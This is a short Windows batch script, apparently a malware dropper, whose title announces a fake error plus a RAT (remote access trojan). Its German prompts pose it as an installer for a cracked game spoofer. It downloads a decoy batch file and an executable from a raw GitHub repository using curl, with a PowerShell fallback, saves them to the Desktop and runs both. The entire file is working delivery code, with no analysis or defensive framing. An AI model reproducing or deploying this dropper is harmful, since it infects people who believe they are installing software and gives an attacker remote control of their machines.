@echo off
title GitHub Installer - BAT Fake Error + RAT
set "REPO_RAW=https://raw.githubusercontent.com/dkdnrkgk/c0zespooferV2/main"
set "INSTALL_DIR=%userprofile%\Desktop\c0ze_install"

mkdir "%INSTALL_DIR%" 2>nul

echo Lade Wave spoofer CRACKED.bat (Fake-Fehler)...
curl -L -o "%INSTALL_DIR%\Wave spoofer CRACKED.bat" "%REPO_RAW%/Wave%20spoofer%20CRACKED.bat"
if errorlevel 1 powershell -Command "Invoke-WebRequest -Uri '%REPO_RAW%/Wave%20spoofer%20CRACKED.bat' -OutFile '%INSTALL_DIR%\Wave spoofer CRACKED.bat'"

echo Lade c0zespooferV2.exe...
curl -L -o "%INSTALL_DIR%\c0zespooferV2.exe" "%REPO_RAW%/c0zespooferV2.exe"
if errorlevel 1 powershell -Command "Invoke-WebRequest -Uri '%REPO_RAW%/c0zespooferV2.exe' -OutFile '%INSTALL_DIR%\c0zespooferV2.exe'"

cd /d "%INSTALL_DIR%"
start "" "Wave spoofer CRACKED.bat"
timeout /t 2
start "" "c0zespooferV2.exe"

echo Fertig. Drueck Enter.
pause >nul